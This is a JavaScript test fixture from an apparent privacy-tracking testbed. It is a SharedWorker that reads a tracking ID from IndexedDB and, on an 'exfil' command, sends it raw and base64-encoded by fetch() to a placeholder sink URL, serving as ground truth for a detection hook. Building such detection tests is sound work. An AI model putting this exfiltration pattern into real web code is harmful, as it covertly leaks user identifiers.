// PrivaDB ground-truth SharedWorker (testbed/pages/wk-shared.js).
// Injected context: when the hook layer is ON, the page's SharedWorker
// wrap points at a blob bootstrap that runs the hook core first and then
// importScripts(this file at its real URL). Reads TID from IndexedDB in
// the shared-worker global and exfiltrates raw + base64.
// Ground truth: ground_truth.py WORKER_FLOWS (/v/shraw, /v/shb64).
const SINK = "__SINK_BASE__";

function readTid() {
  return new Promise((resolve) => {
    try {
      const req = indexedDB.open("wk_db", 1);
      req.onupgradeneeded = (e) => {
        const db = e.target.result;
        if (!db.objectStoreNames.contains("ids"))
          db.createObjectStore("ids");
      };
      req.onsuccess = (e) => {
        const db = e.target.result;
        try {
          const tx = db.transaction("ids", "readonly");
          const g = tx.objectStore("ids").get("tid");
          g.onsuccess = () => resolve(g.result);
          g.onerror = () => resolve(null);
        } catch (err) { resolve(null); }
      };
      req.onerror = () => resolve(null);
    } catch (e) { resolve(null); }
  });
}

self.onconnect = (e) => {
  const port = e.ports[0];
  port.onmessage = async (ev) => {
    if (!ev.data || ev.data.cmd !== "exfil") return;
    const tid = await readTid();
    if (!tid) { port.postMessage("sh-fail:notid"); return; }
    try { fetch(`${SINK}/v/shraw?x=${tid}`); } catch (err) {}
    try { fetch(`${SINK}/v/shb64?x=${btoa(tid)}`); } catch (err) {}
    port.postMessage("sh-done");
  };
  port.start();
};
